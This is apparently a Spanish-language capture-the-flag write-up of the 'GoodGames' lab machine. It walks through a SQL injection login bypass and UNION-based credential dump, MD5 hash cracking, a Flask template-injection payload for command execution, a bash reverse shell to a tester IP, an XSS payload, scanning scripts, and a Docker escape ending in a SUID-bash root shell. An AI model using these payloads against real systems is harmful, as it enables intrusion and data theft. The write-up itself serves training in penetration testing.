
PORT   STATE SERVICE
80/tcp open  http

-Investigamos la web en busca de SQLI , a primera vista no vemos nada

-Hay un Formulario para Loguearse, Interceptamos la Petición en:
	-Sign In

-Logramos saltarnos el Login el siguiente Payload:
	-email='or 1=1-- -&password=hola1234
		-**Login Success**

-Parece que hemos entrado como usuario 'admin', los datos del perfil:
	Nick: admin  
	Email: admin@goodgames.htb

-Arriba a la derecha tenemos un icono de Ajustes, le damos y nos lleva a:
	-http://internal-administration.goodgames.htb/

-Añadimos el dominio **'internal-administration.goodgames.htb'** al /etc/hosts

-Cuando visitamos la web nos encontramos con un Panel de Login en el cual necesitamos credenciales

-Volvemos a anterior Login y usmeamos más

## SQLI (ERROR BASED)

### Manual

-Tenemos la Petición Interceptada en:
	POST /login 
	Host: goodgames.htb

-Sabemos que el Campo Vulnerable es 'email'

-Averiguamos **Cuántas Columnas** tiene la **Tabla Actual**:
	-email=' union select 1,2,3,4-- -&password=test
		LOGIN SUCCESFULL , WELCOME 4
		(Con otro Número de Columnas nos da Error)

-Cómo nos muestra el Número 4, es por dónde vamos a ver el Output

-Listamos la **BDS esxistentes**:
	-email=' union select 1,2,3,schema_name from information_schema.schemata-- -&password=test
		-INFORMATION_SCHEMA 
		-MAIN

-Listamos la **Tablas** de la BD 'MAIN':
	-email=' union select 1,2,3,table_name from information_schema.tables where table_schema='main'-- -&password=test
		-Blog
		-Blog_comments
		-User
	-NOTA: Hay que poner 'main' en minúscula, sino da error

-Listamos la Columnas de la Tabla 'user':
	-email=' union select 1,2,3,column_name from information_schema.columns where table_name='user'-- -&password=test
		-Email
		-Id
		-Name
		-Password

-Listamos el Contenido de los Campos:
	-email=' union select 1,2,3,GROUP_CONCAT(name,0x3a,password) from main.user-- -&password=test
	admin:2b22337f218b2d82dfc3b6f77e7cb8ec

---------------------------------------------------------------------

-Rompemos el hash del usuario Admin:
	-john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
		superadministrator (?)

-Nos vamos al Login en la siguiente ruta e introducimos las credenciales obtenidas:
	-Username: admin
	-Password: superadministrator

-Entramos a un Dashboard de una APP WEB , cuyo servidor es 'FLASK', tenemos que buscar posibles **Server Site Template Injection (SSTI)** para conseguir RCE

-Nos vamos al apartado **'Settings'** y tenemos la opción de cambiar el nombre, cuándo lo hacemos, nuestro nombre sale reflejado en otra parte de la página, junto con otros datos de nuestro perfil
**(Claro indicador de SSTI)**

-Verificamos si el Campo 'Full Name' es vulnerable a SSTI:
	-Full Name:
		{{7*7}}
			49 (FUNCIONA!!, es vulnerable a SSTI)

-Ejecutamos Comandos con el siguiente payload:
	-Full Name:
		-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
			uid=0(root) gid=0(root) groups=0(root)
			(Estamos ejecutando comandos como el usuario root!!)

-Nos mandamos una RS y obtenemos acceso a la máquina:
	-Full Name:
		{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.16/1234 0>&1'").read() }}
			**root@3a453ab39d3d:/# whoami**
				**root**

**-NOTA:** El campo también es vulnerable a XSS:
	-Full Name:
		-<img src=q onerror=alert('XSS')>

## Escalada de Privilegios

-Al entrar a la máquina parece que somos root, pero realmente estamos en un **Contenedor de Docker**:
	-hostname -I:
		172.19.0.2
		(La IP de la Máquina Víctima Final es --> 10.10.11.130)

-Tenemos que Escapar del Contenedor **(Docker Breakout)**

### Docker Breakout

-Nos montamos un script es bash que nos liste los Host activos en la red:
	#!/bin/bash
		for host in {1..254}; do
			timeout 1 bash -c "ping -c 1 172.19.0.$host" &>/dev/null && echo "[+] Host 172.19.0.$host -ACTIVE" &
		done; wait

-Resultado:
	[+] Host 172.19.0.1 -ACTIVE (**BINGO!!** , Esta es una nueva que no conocíamos!!)
	[+] Host 172.19.0.2 -ACTIVE (Esta es en la que estamos actualmente)

-Ahora montamos un Script para listar **Puertos Activos** en el host Descubierto:
	#!/bin/bash
	for port in {1..1000}; do
	timeout 1 bash -c "echo >/dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "port $port is open"
	done
	

-Resultado:
	port 22 is open
	port 80 is open

-Si nos vamos a /home, vemos que existe el usuario 'augustus', vamos a probar a conectarnos por SSH con el y reutilizar la contraseña 'superadministrator':
	-ssh augustus@172.19.0.1
	-Password: superadministrator
		augustus@GoodGames:~$ whoami
			augustus

-hostname -I
	10.10.11.130 172.19.0.1 172.17.0.1
	(Ya estamos en la Máquina Víctima!!)

### Para Escalar 

-Vemos que en la Máquina Final (10.10.11.130) tenemos un directorio en común con la Máquina Docker (172.19.0.2). El directorio en común es **/home/augustus**

-En la **Máquina Final**, nos copiamos la /bin/bash al directorio /home/augustus:
	-cp /bin/bash .

-En la Máquina **172.19.0.2**, nos vamos a /home/augustus y le asignamos el propietario y grupo 'root' a la bash y SUID.
	-chown root:root
	-ls -la:
		-rwxr-xr-x 1 root root 1234376 May 23 14:54 bash
	-Ahora le tenemos que asignar el permiso SUID:
		-chmod u+s bash
		-ls -la:
			-rwsr-xr-x 1 root root 1234376 May 23 14:54 bash

-NOTA: El binario 'chown' se usa para asignar propietarios y grupos a archivos del sistema.

-Volvemos a la **Máquina Final** y Escalamos a root:
	-ssh augustus@172.19.0.1
	-Password: superadministrator
		augustus@GoodGames:~$ ./bash -p
			bash-5.1# whoami
				root





